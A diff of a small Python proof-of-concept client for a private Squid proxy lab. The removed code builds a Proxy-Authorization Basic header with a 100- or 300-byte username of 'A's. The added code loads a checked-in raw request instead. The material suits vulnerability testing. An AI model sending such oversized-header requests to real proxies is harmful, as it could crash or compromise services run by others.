@@ -1,21 +1,21 @@
 #!/usr/bin/env python3
-"""Send one synthetic Basic-auth request to the private Squid lab."""
+"""Send one checked-in HTTP request to the private Squid lab."""
 
 import base64
 import socket
 import sys
+from pathlib import Path
 
 
-if len(sys.argv) != 2 or sys.argv[1] not in {"100", "300"}:
-    raise SystemExit("usage: client.py <100|300>")
-username = b"A" * int(sys.argv[1])
-authorization = base64.b64encode(username + b":pw").decode("ascii")
-request = (
-    "GET http://peerstub/poc HTTP/1.1\r\n"
-    "Host: peerstub\r\n"
-    f"Proxy-Authorization: Basic {authorization}\r\n"
-    "Connection: close\r\n\r\n"
-).encode("ascii")
+if len(sys.argv) != 2:
+    raise SystemExit("usage: client.py <request.http>")
+request = Path(sys.argv[1]).read_bytes()
+authorization = next(
+    line.removeprefix(b"Proxy-Authorization: Basic ")
+    for line in request.split(b"\r\n")
+    if line.startswith(b"Proxy-Authorization: Basic ")
+)
+username = base64.b64decode(authorization, validate=True).split(b":", 1)[0]
 
 print(f"[client] username bytes: {len(username)}", flush=True)
 print("[client] request: GET http://peerstub/poc HTTP/1.1", flush=True)
